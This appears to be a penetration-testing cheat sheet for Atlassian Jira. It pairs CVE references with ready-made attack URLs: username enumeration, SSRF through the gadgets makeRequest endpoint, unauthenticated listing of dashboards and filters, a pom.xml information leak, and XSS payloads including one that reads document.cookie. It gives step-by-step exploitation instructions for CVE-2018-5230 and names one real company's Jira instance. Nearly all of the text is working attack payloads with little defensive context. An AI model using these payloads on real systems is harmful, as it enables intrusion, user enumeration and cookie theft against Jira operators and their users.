# Jira

```bash
# Jira Scanner
# https://github.com/bcoles/jira_scan
# https://github.com/MayankPandey01/Jira-Lens

# cve-2019-8449 
# The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability. 
 https://jira.atlassian.com/browse/JRASERVER-69796
 https://victomhost/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true

# cve-2019-8451:ssrf-response-body 
# The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class.
https://jira.atlassian.com/browse/JRASERVER-69793?jql=labels%20%3D%20
https://victomhost/plugins/servlet/gadgets/makeRequest?url=https://victomhost:1337@example.com

#RCE Jira=CVE-2019–11581
#https://hackerone.com/reports/706841
/secure/ContactAdministrators!default.jspa

# cve-2018-20824
# vulnerable to Server Side Request Forgery (SSRF). This allowed a XSS and or a SSRF attack to be performed. More information about the Atlassian OAuth plugin issue see https://ecosystem.atlassian.net/browse/OAUTH-344 . When running in an environment like Amazon EC2, this flaw can used to access to a metadata resource that provides access credentials and other potentially confidential information. 
 https://victomhost/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)

# cve-2020-14179 
# Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint.
REF=https://jira.atlassian.com/browse/JRASERVER-71536
POC: 
https://victomhost/secure/QueryComponent!Default.jspa

# cve-2020-14181 
# Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint.
Ref=https://jira.atlassian.com/browse/JRASERVER-71560?jql=text%20~%20%22cve-2020-14181%22
# POC:
https://victomhost/secure/ViewUserHover.jspa
https://victomhost/ViewUserHover.jspa?username=Admin
https://hackerone.com/reports/380354

# CVE-2018-5230
# https://jira.atlassian.com/browse/JRASERVER-67289
#HOW TO EXPLOIT:
https://host/issues/?filter=-8
#Go to the link above
#Click the "Updated Range:" text area
#Put your XSS payload in "More than [ ] minutes ago" (15 character payload limit) or in "In range [ ] to [ ]" (No length limit, ONLY put the payload in the first box)
#Click Update
#Payload will run. If it doesn't run chances are you used double quotes somewhere. Only use single quotes!

# jira-unauthenticated-dashboards  
https://victomhost/rest/api/2/dashboard?maxResults=100

# jira-unauth-popular-filters 
https://victomhost/secure/ManageFilters.jspa?filter=popular&filterView=popular

# https://hackerone.com/reports/197726
https://newrelic.atlassian.net/secure/ManageFilters.jspa?filterView=popular
https://newrelic.atlassian.net/secure/ManageFilters.jspa?filterView=search

# https://hackerone.com/reports/139970
https://host/secure/ConfigurePortalPages!default.jspa?view=popular
https://host/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false

#/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm

# CVE-2019-3403
# Information disclosure vulnerability
https://jira.atlassian.com/browse/JRASERVER-69242
#visit the URL address,you can check the user whether is exist on this host
/rest/api/2/user/picker?query=admin
# So the attacker can enumerate all existing users on this jira server.

# CVE-2019-8442
https://jira.atlassian.com/browse/JRASERVER-69241
#visit the URL address,the server will leaking some server's information
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/rest/api/2/user/picker?query=admin
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

# CVE-2017-9506
#https://blog.csdn.net/caiqiiqi/article/details/89017806
/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.nl

#CVE-2019-3402：[Jira]XSS in the labels gadget
/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
ConfigurePortalPages.jspa

#CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter
/plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
```
